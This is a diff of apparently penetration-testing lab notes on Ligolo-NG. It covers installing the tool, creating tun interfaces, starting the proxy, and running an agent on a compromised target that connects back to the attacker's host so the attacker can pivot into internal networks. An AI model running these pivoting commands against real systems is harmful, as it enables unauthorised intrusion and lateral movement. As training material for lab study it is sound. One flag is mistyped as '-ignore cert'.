@@ -3,10 +3,7 @@
 
 ## 🔧 Install on Parrot OS (Proxy/Relay Server)
 
-Parrot OS is Debian-based, so you can grab the latest precompiled binaries directly from GitHub. The current version is **0.8.2**.
-
-bash
-
+Parrot OS is Debian-based, so you can grab the latest precompiled binaries directly from GitHub. 
 ```bash
 # Create a working directory
 mkdir ~/ligolo-ng && cd ~/ligolo-ng
@@ -124,4 +121,29 @@ nmap -Pn -p 22 172.16.119.10
 
 ```
 C:\Users\mlefay\AppData\Local\Temp\agent.exe -connect 172.16.5.35:11601 -ignore-cert
+```
+
+
+# Multiple Pivoting using Ligolo-NG
+
+- For each network that we're gonna discover, we'll create a new network interface on our attack box
+
+#### Creating the network interface
+
+```python
+sudo ip tuntap add user htb-ac-2081772 mode tun ligolo
+sudo ip link set ligolo up
+```
+
+#### Start the ligolo-ng proxy
+```python
+sudo proxy -selfcert
+```
+
+#### Transfer the ligolo agent to the target host
+- we can do that using any method.
+```python
+#on the target host
+chmod +x agent
+./agent -connect <ip-address-of-attack-host>:11601 -ignore cert
 ```
